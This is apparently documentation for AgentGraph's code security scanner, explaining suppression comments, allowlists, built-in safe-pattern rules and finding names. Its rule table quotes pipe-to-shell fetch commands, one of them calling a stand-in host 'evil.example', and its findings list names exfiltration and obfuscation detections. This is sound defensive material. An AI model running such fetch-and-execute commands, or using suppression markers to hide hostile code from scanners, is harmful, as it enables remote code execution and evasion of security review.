# Reducing Security Scan False Positives

AgentGraph's security scanner analyzes your source code for potential vulnerabilities. Sometimes it flags code that is actually safe — these are **false positives**. You have two ways to suppress them.

## Option 1: Inline Suppression (`ag-scan:ignore`)

Add `# ag-scan:ignore` as a comment on any line to suppress all findings on that line.

**Python:**
```python
result = subprocess.run(["scp", "-i", key, file, dest])  # ag-scan:ignore
```

**JavaScript / TypeScript:**
```javascript
const output = execSync('git status')  // ag-scan:ignore
```

**When to use:** For individual lines where you're confident the code is safe. This is the quickest way to suppress a specific finding.

## Option 2: Allowlist File

If your project has many findings of the same type, or you want to suppress findings across multiple files without touching the source code, you can request an allowlist entry.

The allowlist maps **file path patterns** to **finding names**. For example:

| File Path | Finding Name | Effect |
|-----------|-------------|--------|
| `src/deploy.py` | `subprocess.run / Popen (Python)` | Suppresses subprocess findings in that exact file |
| `scripts/*` | `subprocess.run / Popen (Python)` | Suppresses subprocess findings in all files under `scripts/` |
| `src/config.py` | `Unrestricted file read (Python)` | Suppresses file-read findings in config.py |

To request an allowlist entry, contact the AgentGraph team or open an issue.

## What the Scanner Already Handles

The scanner has built-in **context-aware checks** that automatically skip safe patterns — you don't need to suppress these:

| Pattern | Why It's Safe |
|---------|---------------|
| `subprocess.run(["git", "status"])` | First argument is a hardcoded string literal |
| `subprocess.run(cmd, shell=False)` | Explicit `shell=False` prevents shell injection |
| `ast.literal_eval(data)` | Safe eval — only parses Python literals |
| `curl -fsSL https://.../install.sh \| bash` | Nothing to fetch as written: the URL's host is literally elided (low). Never in agent instructions (SKILL.md, AGENTS.md, a skills dir) or an install hook, and restored to critical when anything a consumer runs (a package script, an install hook, spawning code) names the file. A real host with an elided path (`https://x.io/.../i.sh`), a bare `setup.sh` / `install.sh` (a host under the `.sh` TLD), hosts like `bun.sh/install` and variables (`$URL`) stay critical |
| `{"cmd": "curl https://evil.example/x.sh \| sh", "expect": "SHADOW"}` in a test, fixture or corpus file (JSON or Python) | An attack sample in a security tool's test cases (low). Only on a test / fixture / corpus path, only when every host is reserved (`.example`, `.invalid`, `example.com`), and not when a curl / wget flag or proxy variable routes the fetch elsewhere (`--connect-to`, `--resolve`, `-x` / `--proxy`, `-K`). A sample whose key reaches an exec sink, or that names a real host, stays critical |
| `json.loads(text)` | Not actually `eval()` despite containing "eval" in the call |
| `open("config.json", "r").read()` | Hardcoded file path string |
| `with open(path) as f:` | Context manager ensures proper resource handling |
| `Path("out.txt").write_text(data)` | Pathlib method call on a known path |
| `placeholder: 'acme.tunnel.example'`, `"e.g. acme.tunnel.example"`, a host-allowlist suffix, a bundled public-suffix list | In JS / TS code only, a tunnel host listed as data is reported low, not critical, but only while it can never be dialled: its holder is never passed on, interpolated or returned; the object around it is never read whole (`Object.values`, spread, `JSON.stringify`, iterated, passed to a call); it is not returned from a function, exported, or set on `this` or a global; it is not handed to a function the package defines itself; no other code shares its line; and nothing in the package reads the file's (or the enclosing function's) source text. Anything else keeps the critical. A value in a JSON, YAML or Python file keeps it too. |

## Finding Names Reference

When using `ag-scan:ignore` or requesting allowlist entries, the finding names match what's shown in the scan results:

**Unsafe Execution:**
- `subprocess.run / Popen (Python)`
- `os.system / os.popen (Python)`
- `eval() call`
- `exec() call (Python)`
- `child_process (Node.js)`
- `execSync / spawn (Node.js)`
- `shell=True (Python)`

**Filesystem Access:**
- `Unrestricted file read (Python)`
- `Unrestricted file write (Python)`
- `fs.readFileSync / writeFileSync (Node.js)`
- `Path traversal risk (../ in string)`
- `rmrf / recursive delete`

**Data Exfiltration:**
- `HTTP POST with sensitive data`
- `Outbound webhook/exfil URL`
- `Base64 encode + send`
- `Environment variable exfil`
- `DNS exfiltration pattern`

**Code Obfuscation:**
- `Hex-encoded string execution`
- `String char-code assembly`
- `Obfuscated eval (Python)`
- `Dynamic import with variable`
- `Reversed/rotated string decode`

## Questions?

If you believe a finding is a false positive and neither suppression method fits your case, [open an issue](https://github.com/agentgraph-co/agentgraph/issues) with the finding details and we'll look into improving the scanner.
